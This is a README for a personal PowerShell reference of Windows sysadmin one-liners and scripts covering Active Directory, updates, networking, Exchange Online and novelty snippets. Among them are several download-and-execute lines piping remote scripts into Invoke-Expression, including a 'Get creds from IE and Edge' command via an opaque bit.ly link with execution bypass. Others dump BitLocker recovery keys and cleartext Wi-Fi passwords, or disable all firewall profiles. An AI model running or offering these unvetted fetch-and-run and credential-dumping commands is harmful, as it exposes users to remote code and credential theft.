![header](https://capsule-render.vercel.app/api?type=waving&color=012456&fontColor=ffffff&height=150&section=header&fontAlignY=38&text=Powershell%20Reference&fontSize=60)

# Powershell Reference

A collection of commands, code snippets, and scripts tailored for managing and automating tasks in a Windows environment. Designed for experienced administrators, this resource delves beyond basic PowerShell usage, offering practical solutions for a variety of scenarios.

You can access a number of these commands via a simple menu by running the following command. The commands are defined in `commands.json` located in this repo

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/superswan/Powershell-SysAdmin/refs/heads/master/psreference.ps1" -UseBasicParsing | Invoke-Expression
```

**Short Version:**

```powershell
iwr 3to.moe/psr | iex 
```

* [Practice](#practice)
* [One-Liners](#one-liners)
* [Snippets](#snippets)
* [Active Directory](#active-directory)
* [Microsoft 365](#microsoft-365)
* [Scripts](#scripts)
* [Windows Defender](#windows-defender)
* [Fun](#fun)

#### Install Winget

```powershell
Invoke-WebRequest -Uri "https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle" -OutFile "C:\WinGet.msixbundle"
Add-AppxPackage "C:\WinGet.msixbundle"
Add-AppxPackage -RegisterByFamilyName -MainPackage Microsoft.Winget.Source_8wekyb3d8bbwe
```

---

## Practice

Not sure if the slack channel is active usually it's the name of the exercise with a 1 at the end like `century1`

[Under The Wire](https://underthewire.tech)

## Combinging Powershell output with Linux programs (WSL2)

If a wsl2 distro is installed commands from the default distro can be called with `wsl` this can be combined with `Convert-To-JSON` to use common linux data-wrangling tools like `awk`, `sed`, and `grep`

```powershell
get-hotfix | ConvertTo-Json | wsl jq '.[] | .HotFixID' | wsl sort
```

## One-Liners

#### Execute last command (Equivalent to Bash `!!`)
```
Invoke-History -Id (Get-History -Count 1).Id
```

#### Close All Open Windows

```
Get-Process | Where-Object { $_.MainWindowTitle } | Stop-Process
```

#### Kill processes by company/vendor

Like when you can't uninstall Creative Cloud

```powershell
Get-Process | Where-Object {$_.Company -like "*Adobe*"} | Stop-Process -Force
```

#### Get Shutdown Events

```
Get-WinEvent -LogName System | Where-Object { $_.ID -eq 6006 -or $_.ID -eq 6008 -or $_.ID -eq 1074 } | Format-List -Property TimeCreated, ID, Message
```

#### Get Active Directory User Info

```
Get-ADUser -Filter "Name -like '*partofname*'"
```

#### Get Domain Name

``$domain = []::GetCurrentDomain().Name``

#### Find Domain Controller using DNS

``Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.$domainName" -QueryType SRV``

#### "Pong Command" - Listen for Pings. Uses WinDump.exe

``.\WinDump.exe -i 3 icmp and icmp[icmp-echoreply]=icmp-echo``

#### Enable/Disable Firewall (All Profiles)

``Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False``

#### Enable File and Printer Sharing

``Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True``

#### Enable Linked Connections (Administrative and regular user accounts can see the same network shares)

``reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f``

#### Enable ICMP

``netsh advfirewall firewall add rule name="Allow incoming ping requests IPv4" dir=in action=allow protocol=icmpv4 ``

#### Prefer IPv4 over IPv6

This adjusts the IPv6 prefix policies so that IPv4 addresses are preferred (Ping, DNS Resolution, etc.). Run both commands.

``netsh int ipv6 set prefixpolicy ::ffff:0:0/96 46 4``

``netsh int ipv6 set prefixpolicy ::/0 45 6``

#### Reset networking stack

``netsh int ip reset``

``netsh winsock reset``

#### Forcefully open Internet Explorer

``mshta.exe "javascript:open();close();"``

### Remote Manage

#### Enable RDP

``reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f``

#### Set NLA

``Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\‘ -Name “UserAuthentication” -Value 1``

#### Firewall Rule

``Enable-NetFirewallRule -DisplayGroup “Remote Desktop”``

#### Bloatware Remover (Outdated)

``iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/debloat'))``

#### Remote Event Viewer

``  Set-NetFirewallRule -DisplayGroup 'Remote Event Log Management' -Enabled True -PassThru``

#### Update computers remotely

``Invoke-WuJob -ComputerName $Computers -Script { ipmo PSWindowsUpdate; Install-WindowsUpdate -AcceptAll -IgnoreReboot | Out-File "C:\Windows\PSWindowsUpdate.log"} -RunNow -Confirm:$false -Verbose -ErrorAction Ignore``

#### Ctrl + WIN + Shift + B (GPU Reset)

``Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Keyboard {[DllImport("user32.dll")]public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);}' ; [Keyboard]::keybd_event(0x11, 0, 0, 0); [Keyboard]::keybd_event(0x10, 0, 0, 0); [Keyboard]::keybd_event(0x5B, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 2, 0); [Keyboard]::keybd_event(0x5B, 0, 2, 0); [Keyboard]::keybd_event(0x10, 0, 2, 0); [Keyboard]::keybd_event(0x11, 0, 2, 0);``

#### Get creds from IE and Edge

``powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"``

```
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] $vault = New-Object Windows.Security.Credentials.PasswordVault $vault.RetrieveAll() | ForEach {$vault.Remove($_)}
```

#### Count Mailboxes based on office or chosen property

``Get-Mailbox | Group-Object -Property:Office | Select-Object name,count``

#### Get all PC Names according to pattern (requires activedirectory module)

`` Get-ADComputer -Filter "Name -like 'PC-*'" | Select-String -Pattern PC-\d+``

#### Get all computer names

``Get-ADComputer -Filter * | Select-Object -ExpandProperty Name``

#### Get computer last logon

```
Get-ADComputer -Filter * -Properties Name,OperatingSystem ,lastlogontimestamp | Select Name,OperatingSystem ,@{N='lastlogontimestamp'; E={[DateTime]::FromFileTime($_.lastlogontimestamp)}}
```

#### Get current logged on user

`` query user /server:$SERVER``

#### Get LastLogonDate/LastLogon for each computer

```
Get-ADComputer -Filter * -Properties * | Sort LastLogon | Select Name, LastLogonDate,@{Name='LastLogon';Expression={[DateTime]::FromFileTime($_.LastLogon)}}
```

#### Get All Disabled Users (Excluding OU)

``Search-ADAccount -AccountDisabled -UsersOnly | Where {$_.DistinguishedName -notlike "*OU=Disabled Users,OU=USERS,DC=EXAMPLE,DC=COM"}``

#### Get LastLogon for User

``Get-ADUser -Identity “username” -Properties “LastLogonDate”``

#### Enable Hyper-V

``Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All``

#### Toggle SMBv1

``Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force``

#### Enable script execution

``powershell.exe Set-ExecutionPolicy Bypass -Force``

#### Retrieve Inventory of Installed Applications on remote computer (requires winget)

`Invoke-Command -ComputerName COMPUTER-01 -ScriptBlock { winget list}`

#### Scheduled Reboot

`shutdown -r -t $([int]([datetime]"11PM"-(Get-Date)).TotalSeconds)`

#### Restart Explorer

```
gps explorer | spps
```

#### WAC and PowerShell Remote Management

```
Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private
Enable-PSRemoting -force
```

#### Time Sync

```
w32tm /query /status
w32tm /config /manualpeerlist:"time.google.com,time.cloudflare.com,time.windows.com" /syncfromflags:manual /reliable:YES /update
Restart-Service w32time
w32tm /resync
```

## Snippets

#### Reset Windows Update

```powershell
# Stop Windows Update Services
Write-Host "Stopping Windows Update Services..."
Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue
Stop-Service -Name cryptSvc -Force -ErrorAction SilentlyContinue
Stop-Service -Name bits -Force -ErrorAction SilentlyContinue
Stop-Service -Name msiserver -Force -ErrorAction SilentlyContinue

# Rename SoftwareDistribution and Catroot2 Folders
Write-Host "Renaming SoftwareDistribution and Catroot2 Folders..."
Rename-Item -Path "C:\Windows\SoftwareDistribution" -NewName "SoftwareDistribution.old" -ErrorAction SilentlyContinue
Rename-Item -Path "C:\Windows\System32\catroot2" -NewName "catroot2.old" -ErrorAction SilentlyContinue

# Re-register Windows Update DLLs
Write-Host "Re-registering Windows Update DLLs..."
$Dlls = @(
    "atl.dll", "urlmon.dll", "mshtml.dll", "shdocvw.dll", "browseui.dll",
    "jscript.dll", "vbscript.dll", "scrrun.dll", "msxml.dll", "msxml3.dll",
    "msxml6.dll", "actxprxy.dll", "softpub.dll", "wintrust.dll", "dssenh.dll",
    "rsaenh.dll", "gpkcsp.dll", "sccbase.dll", "slbcsp.dll", "cryptdlg.dll",
    "oleaut32.dll", "ole32.dll", "shell32.dll", "initpki.dll", "wuapi.dll",
    "wuaueng.dll", "wucltui.dll", "wups.dll", "wups2.dll", "wuweb.dll",
    "qmgr.dll", "qmgrprxy.dll", "wucltux.dll", "muweb.dll", "wuwebv.dll"
)

foreach ($Dll in $Dlls) {
    Try {
        regsvr32.exe /s "C:\Windows\System32\$Dll"
        Write-Host "Registered $Dll"
    } Catch {
        Write-Warning "Failed to register $Dll"
    }
}

# Reset Winsock
Write-Host "Resetting Winsock..."
netsh winsock reset

# Restart Windows Update Services
Write-Host "Restarting Windows Update Services..."
Start-Service -Name wuauserv -ErrorAction SilentlyContinue
Start-Service -Name cryptSvc -ErrorAction SilentlyContinue
Start-Service -Name bits -ErrorAction SilentlyContinue
Start-Service -Name msiserver -ErrorAction SilentlyContinue

Write-Host "Windows Update reset complete. You may need to restart your computer."
```

#### Inventory collection script (Logon script that pushes system info to share)

```powershell
$filename = Join-Path -Path \\server-name\IT-Inventory\ -ChildPath "${env:COMPUTERNAME}.txt"


Get-ComputerInfo | 
    Select-Object CsName, CsManufacturer, CsModel, BiosSeralNumber, CsProcessors, CsPhyicallyInstalledMemory, OsName, OsVersion, CsUserName |
    Sort-Object |
    out-file -FilePath $filename
```

```powershell
# Get the current directory
$currentDirectory = Get-Location

# Define the output CSV file name
$outputCsv = "$currentDirectory\output.csv"

# Initialize an empty array to store the data
$dataArray = @()

# Loop through each file in the current directory
Get-ChildItem -Path $currentDirectory -File | ForEach-Object {
    $file = $_.FullName

    # Read the file contents
    $content = Get-Content -Path $file

    # Create a hashtable to store the data for each file
    $dataHash = @{}
  
    # Parse each line and extract key-value pairs
    foreach ($line in $content) {
        if ($line -match "^(.*)\s+:\s+(.*)$") {
            $key = $matches[1].Trim()
            $value = $matches[2].Trim()

            # Add the key-value pair to the hashtable
            $dataHash[$key] = $value
        }
    }

    # Convert the hashtable to a custom object and add to the data array
    $dataArray += New-Object PSObject -Property $dataHash
}

# Define the custom column headers
$columnHeaders = @{
    "CsName" = "Computer Name"
    "CsManufacturer" = "Manufacturer"
    "CsModel" = "Model"
    "BiosSeralNumber" = "BIOS Serial Number"
    "CsProcessors" = "Processor"
    "CsPhyicallyInstalledMemory" = "Physical Memory (Bytes)"
    "OsName" = "Operating System"
    "OsVersion" = "OS Version"
    "CsUserName" = "User Name"
}

# Create a new array with custom headers
$customDataArray = $dataArray | Select-Object @{Name='Computer Name';Expression={$_.CsName}},
                                                @{Name='Manufacturer';Expression={$_.CsManufacturer}},
                                                @{Name='Model';Expression={$_.CsModel}},
                                                @{Name='BIOS Serial Number';Expression={$_.BiosSeralNumber}},
                                                @{Name='Processor';Expression={$_.CsProcessors}},
                                                @{Name='Physical Memory (Bytes)';Expression={$_.CsPhyicallyInstalledMemory}},
                                                @{Name='Operating System';Expression={$_.OsName}},
                                                @{Name='OS Version';Expression={$_.OsVersion}},
                                                @{Name='User Name';Expression={$_.CsUserName}}

# Export the data to a CSV file
$customDataArray | Export-Csv -Path $outputCsv -NoTypeInformation
```

#### Dump all Bitlocker IDs and Recovery Keys from Active Directory

```powershell

Import-Module ActiveDirectory

$computers = Get-ADComputer -Filter * -Property Name | ForEach-Object {
    $recoveryKeys = Get-ADObject -Filter 'objectclass -eq "msFVE-RecoveryInformation"' -SearchBase $_.DistinguishedName -Properties 'msFVE-RecoveryPassword'
    foreach ($key in $recoveryKeys) {
        [PSCustomObject]@{
            ComputerName = $_.Name
            RecoveryKeyID = $key.Name
            RecoveryPassword = $key.'msFVE-RecoveryPassword'
        }
    }
}

$computers | Format-Table -AutoSize
```

#### Batch convert HEIC to JPG (Requires ImageMagick)

```powershell
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Select-FolderDialog {
    $folderBrowser = New-Object System.Windows.Forms.FolderBrowserDialog
    $folderBrowser.Description = "Select the folder containing HEIC images"
    $result = $folderBrowser.ShowDialog()
    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
        return $folderBrowser.SelectedPath
    }
    return $null
}

function Select-SaveFileDialog {
    $saveFileDialog = New-Object System.Windows.Forms.SaveFileDialog
    $saveFileDialog.Filter = "PDF files (*.pdf)|*.pdf"
    $saveFileDialog.Title = "Save PDF As"
    $saveFileDialog.DefaultExt = "pdf"
    $result = $saveFileDialog.ShowDialog()
    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
        return $saveFileDialog.FileName
    }
    return $null
}

function Convert-HEICtoPDF {
    [System.Windows.Forms.Application]::EnableVisualStyles()

    $inputDir = Select-FolderDialog
    if (-not $inputDir) {
        [System.Windows.Forms.MessageBox]::Show("No folder selected. Exiting.")
        return
    }

    $outputPdf = Select-SaveFileDialog
    if (-not $outputPdf) {
        [System.Windows.Forms.MessageBox]::Show("No output file selected. Exiting.")
        return
    }

    $heicFiles = Get-ChildItem -Path $inputDir -Filter *.heic
    if ($heicFiles.Count -eq 0) {
        [System.Windows.Forms.MessageBox]::Show("No HEIC files found in the directory.")
        return
    }

    foreach ($file in $heicFiles) {
        $jpgFile = [System.IO.Path]::ChangeExtension($file.FullName, ".jpg")
        & magick "$($file.FullName)" "$jpgFile"
    }

    $jpgFiles = Get-ChildItem -Path $inputDir -Filter *.jpg
    & magick convert $jpgFiles.FullName $outputPdf

    [System.Windows.Forms.MessageBox]::Show("PDF created successfully at $outputPdf")
}

Convert-HEICtoPDF
```

#### Push Updates to Remote Computers using Invoke-WuJob (PSWindowsUpdate)

```powershell
$Computers = @("PC01","PM04","PC06","PC08","PC-JOAN","PC-SARA","LAWOFFICE-2","PC03","PC07")
$OnlineComputers = @()

foreach ($Computer in $Computers) {
    if (Test-Connection -ComputerName $Computer -Count 1 -Quiet) {
        $OnlineComputers += $Computer
    }
    else {
        Write-Host "$Computer is offline."
    }
}

Invoke-WuJob -ComputerName $OnlineComputers -Script { 
    ipmo PSWindowsUpdate; 
    Install-WindowsUpdate -AcceptAll -IgnoreReboot -MicrosoftUpdate | Out-File "C:\Windows\PSWindowsUpdate.log"
} -RunNow -Confirm:$false -Verbose -ErrorAction Ignore
```

#### Self-elevate script

```powershell
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
 if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
  $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
  Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
  Exit
 }
}
```

#### Get logged in users for each computer

```powershell
$COMPUTER_LIST = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name

foreach ($COMPUTER in $COMPUTER_LIST) {
echo [$COMPUTER]
query user /server:$COMPUTER
echo `n
}
```

#### Update PATH Environment Variable Dynamically

Portable tools and programs are placed in a directory, loops over the directory and adds subfolders to PATH environment variable if they don't already exist.

```powershell
$binPath = "C:\bin"
Get-ChildItem -Path $binPath -Directory | ForEach-Object {
    $currentPath = [System.Environment]::GetEnvironmentVariable("PATH", "Machine")
    $newPath = $_.FullName
    If (-Not $currentPath.Contains($newPath)) {
        [System.Environment]::SetEnvironmentVariable("PATH", "$currentPath;$newPath", "Machine")
    }
}
```

#### Schedule Reboot

```powershell
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "& {Restart-Computer -Force -wait}"'
$trigger = New-ScheduledTaskTrigger -Once -At 3am
$taskname = 'ScheduledReboot'

$params = @{
Action  = $action
Trigger = $trigger
TaskName = $taskname
}

    if(Get-ScheduledTask -TaskName $params.TaskName -EA SilentlyContinue) { 
        Set-ScheduledTask @params
     }
    else {
        Register-ScheduledTask @params
    }
```

#### Toggle touch screen

```powershell
$TouchScreenDevices = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*HID-compliant touch screen*" }

foreach ($Device in $TouchScreenDevices) {
    if ($Device.Status -eq 'OK') {
        Write-Output "Disabling device: $($Device.FriendlyName)..."
        Disable-PnpDevice -InstanceId $Device.InstanceId -Confirm:$false
    } else {
        Write-Output "Enabling device: $($Device.FriendlyName)..."
        Enable-PnpDevice -InstanceId $Device.InstanceId -Confirm:$false
    }
}
```

#### List all installed software via Registry keys

```powershell
$registryPaths = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
)


$installedSoftware = Get-ItemProperty -Path $registryPaths |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object { $_.DisplayName -and $_.DisplayName -ne "" } |
    Sort-Object DisplayName


$installedSoftware
```

#### Get REG key of any installed program

```powershell
$keys = dir HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall | where { $_.GetValueNames() -contains 'DisplayName' }
$keys += dir HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall | where { $_.GetValueNames() -contains 'DisplayName' }
 
$k = $keys | where { $_.GetValue('DisplayName') -eq 'DISPLAYNAMEHERE' }
```

#### Do maintenance

**Requires PatchMyPC**

```powershell
# Windows Update
if ((Get-Module -ListAvailable -Name PSWindowsUpdate) -eq $null)
{
    Write-Host -ForegroundColor Yellow "Windows Update module not found, installing..."
    Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
    Install-Module -Name PSWindowsUpdate -Force
}

Write-Host -ForegroundColor Yellow "Getting Windows Updates..."
Import-Module PSWindowsUpdate
Install-WindowsUpdate -AcceptAll -IgnoreReboot

# Patch Software
Write-Host -ForegroundColor Yellow "Patching installed software..."
& C:\Users\ITAdmin\Downloads\PatchMyPC.exe /auto -Wait

# System File Check
sfc /scannow

# Cleanup disk
cleanmgr.exe /full
```

#### File organizer

```powershell
# PowerShell script to organize files into subdirectories based on file type, without moving existing directories
# ! Use with caution there is no confirmation or undo !

# Prompt user to enter the directory path
$directoryPath = Read-Host -Prompt 'Enter the directory path'

# Check if the directory exists
if (-Not (Test-Path $directoryPath)) {
    Write-Host "The directory does not exist."
    exit
}

# Define subdirectory names and file extensions
$subdirectories = @{
    "Photos" = @("*.jpg", "*.jpeg", "*.png", "*.gif", "*.bmp", "*.tiff");
    "Videos" = @("*.mp4", "*.mov", "*.wmv", "*.flv", "*.avi", "*.mkv");
    "Documents" = @("*.doc", "*.docx", "*.pdf", "*.txt", "*.xls", "*.xlsx", "*.ppt", "*.pptx");
    "Bin" = @("*.exe", "*.bin", "*.dll", "*.bat", "*.msi");
    "Other" = @()
}

# Function to move files to their respective subdirectories
function Move-Files {
    param(
        [string]$SubDir,
        [string[]]$Extensions
    )

    # Create the subdirectory if it doesn't exist
    $subDirPath = Join-Path $directoryPath $SubDir
    if (-Not (Test-Path $subDirPath)) {
        New-Item -Path $subDirPath -ItemType Directory | Out-Null
    }

    # Move files to the subdirectory
    foreach ($extension in $Extensions) {
        Get-ChildItem -Path $directoryPath -Filter $extension -File | Move-Item -Destination $subDirPath
    }
}

# Move files based on extensions
foreach ($subDir in $subdirectories.Keys) {
    Move-Files -SubDir $subDir -Extensions $subdirectories[$subDir]
}

# Move remaining files to 'Other' directory
Get-ChildItem -Path $directoryPath -File | 
    Where-Object { $_.Extension -notin $subdirectories.Values -and !($_.PSIsContainer) } | 
    Move-Item -Destination (Join-Path $directoryPath "Other")
```

#### Dump Wireless Password For All Profiles

```powershell
$profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}

foreach ($profile in $profiles) {

    # Get details about the profile, including the password in clear text
    $password = (netsh wlan show profile name=$profile key=clear) | Select-String "Key Content\W+\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}

    # Print the profile name and password
    "SSID: $profile"
    "Password: $password"
    "-------------------------"
}
```

#### Winget Bulk Install

https://winstall.app

```powershell
winget install --id=Microsoft.DotNet.Framework.DeveloperPack_4 -e  ; winget install --id=Google.Chrome -e  ; winget install --id=Microsoft.VCRedist.2013.x64 -e  ; winget install --id=Microsoft.VCRedist.2013.x86 -e  ; winget install --id=Microsoft.VCRedist.2015+.x64 -e  ; winget install --id=Microsoft.VCRedist.2015+.x86 -e  ; winget install --id=Microsoft.VCRedist.2012.x64 -e  ; winget install --id=Microsoft.VCRedist.2012.x86 -e  ; winget install --id=Microsoft.VCRedist.2010.x64 -e  ; winget install --id=Microsoft.VCRedist.2010.x86 -e  ; winget install --id=Microsoft.VCRedist.2005.x86 -e  ; winget install --id=Microsoft.VCRedist.2008.x86 -e  ; winget install --id=Microsoft.VCRedist.2008.x64 -e  ; winget install --id=Oracle.JavaRuntimeEnvironment -e  ; winget install --id=7zip.7zip -e  ; winget install --id=Adobe.Acrobat.Reader.64-bit -e 
```

#### Install and configure Windows Subsystem for Linux (Server 2019)

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux

curl.exe -L -o debian.appx https://aka.ms/wsl-debian-gnulinux
Rename-Item .\debian.appx debian.zip
Expand-Archive .\debian.zip debian
Expand-Archive .\debian\DistroLauncher-Appx_1.12.1.0_x64.appx
.\debian\DistroLauncher-Appx_1.12.1.0_x64\debian.exe
```

#### List Mapped Network Printers with IP Address

```powershell
$printers = Get-WmiObject -Query "SELECT * FROM Win32_Printer"
foreach ($printer in $printers) {
    $portName = $printer.PortName
    $port = Get-WmiObject -Query "SELECT * FROM Win32_TCPIPPrinterPort WHERE Name = '$portName'"
    if ($port -ne $null) {
        [PSCustomObject]@{
            PrinterName = $printer.Name
            IPAddress = $port.HostAddress
        }
    }
}
```

## Active Directory

```
Import-Module ActiveDirectory
```

#### Locate all DCs

```powershell
dig +noall +answer _ldap._tcp.dc._msdcs.<domain-name> SRV
```

```powershell
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain-name>
```

```powershell
nltest /dclist:<your-domain-name>
```

```powershell
Get-ADDomainController -Filter * | Select Name, HostName, Site
```

#### Disable all stale computer accounts (90 days)

```powershell
# Import the Active Directory module
Import-Module ActiveDirectory

# Define the number of days for stale account detection
$StaleDays = 90

# Calculate the date from $StaleDays ago
$Date = (Get-Date).AddDays(-$StaleDays)

# Find computer accounts that haven't logged in since $Date
$StaleComputers = Get-ADComputer -Filter {LastLogonTimeStamp -lt $Date} -Properties LastLogonTimeStamp

# Loop through each stale computer and remove it
foreach ($Computer in $StaleComputers) {
    $ComputerName = $Computer.Name
    $LastLogonDate = [datetime]::FromFileTime($Computer.LastLogonTimeStamp)
  
    Write-Host "Removing computer: $ComputerName (Last Logon: $LastLogonDate)"
  
    # Remove the computer account from Active Directory
    # Uncomment the next line to perform the deletion
    # Remove-ADComputer -Identity $Computer.DistinguishedName -Confirm:$false
}

# Output completion message
Write-Host "Completed removal of stale computer accounts."
```

#### Retrieve list of all DCs and assigned FSMO roles

```
Import-Module ActiveDirectory


$DCs = Get-ADDomainController -Filter *

foreach ($DC in $DCs) {
    $roles = @()

    $forest = Get-ADForest
    if ($DC.HostName -eq $forest.SchemaMaster) { $roles += "Schema Master" }
    if ($DC.HostName -eq $forest.DomainNamingMaster) { $roles += "Domain Naming Master" }

    $domain = Get-ADDomain
    if ($DC.HostName -eq $domain.RIDMaster) { $roles += "RID Master" }
    if ($DC.HostName -eq $domain.InfrastructureMaster) { $roles += "Infrastructure Master" }
    if ($DC.HostName -eq $domain.PDCEmulator) { $roles += "PDC Emulator" }

    [PSCustomObject]@{
        DomainController = $DC.HostName
        Roles = $roles -join ', '
    }
}
```

## Microsoft 365

#### Connect to Exchange Online

```
Install-Module -Name ExchangeOnlineManagement
Import-Module ExchangeOnlineManagement
Connect-ExchangeOnline -UserPrincipalName <UPN> [-ExchangeEnvironmentName <Value>] [-ShowBanner:$false] [-DelegatedOrganization <String>] [-SkipLoadingFormatData]
```

#### Exchange Online MailBox info (Mailbox size and Archive size)

```powershell
Get-Mailbox -RecipientTypeDetails UserMailbox | ForEach-Object {
    $mailboxStats = Get-MailboxStatistics $_.Identity
    $archiveStats = @{TotalItemSize = "N/A"}  # Default value in case there's no archive.
    if ($_.ArchiveStatus -eq 'Active') {
        $archiveStats = Get-MailboxStatistics $_.Identity -Archive
    }
    [PSCustomObject]@{
        DisplayName = $_.DisplayName
        PrimarySmtpAddress = $_.PrimarySmtpAddress
        ArchiveStatus = $_.ArchiveStatus
        AutoExpandArchive = $_.AutoExpandingArchiveEnabled
        TotalItemSize = $mailboxStats.TotalItemSize
        ArchiveSize = if ($_.ArchiveStatus -eq 'Active') {$archiveStats.TotalItemSize} else {"Not Applicable"}
    }
} | Select-Object DisplayName, PrimarySmtpAddress, ArchiveStatus, AutoExpandArchive, TotalItemSize, ArchiveSize
```

## Scripts

* [HP Bloatware Removal](https://gist.github.com/mark05e/a79221b4245962a477a49eb281d97388) (varied results)
* [AD Audit](https://github.com/phillips321/adaudit)
* [Microsoft Official Windows Search Reset](https://www.microsoft.com/en-us/download/details.aspx?id=100295)
* PSCmder (Really bad PDQ alternative, script and `commands.txt` are in this repo. Usefull for remote installation or command exec)
* [CIS Critical Controls](https://github.com/robvandenbrink/Critical-Controls-v7)

## Windows Defender

[Windows Defender is enough, if you harden it](https://gist.github.com/superswan/1d6ed59e75273f90a481428964be3ae5)

## Fun

#### Final Fantasy Victory Beep

```
[console]::beep(784,300); Start-Sleep -Milliseconds 100; [console]::beep(784,600); [console]::beep(622,600); [console]::beep(698,600); [console]::beep(784,200); Start-Sleep -Milliseconds 200; [console]::beep(698,200); [console]::beep(784,800)
```

#### DVD Cursor

Bounces cursor around the screen like the DVD logo

```
Add-Type -AssemblyName System.Windows.Forms

# Get screen dimensions
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$maxX = $bounds.Width
$maxY = $bounds.Height

$x = [System.Windows.Forms.Cursor]::Position.X
$y = [System.Windows.Forms.Cursor]::Position.Y

# Movement vector (speed)
$dx = 14
$dy = 14

while ($true) {
    $x += $dx
    $y += $dy

    # Check for screen bounds and reverse direction if needed
    if ($x -le 0 -or $x -ge $maxX) {
        $dx = -$dx
    }
    if ($y -le 0 -or $y -ge $maxY) {
        $dy = -$dy
    }

    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
  
    Start-Sleep -Milliseconds 50
}
```
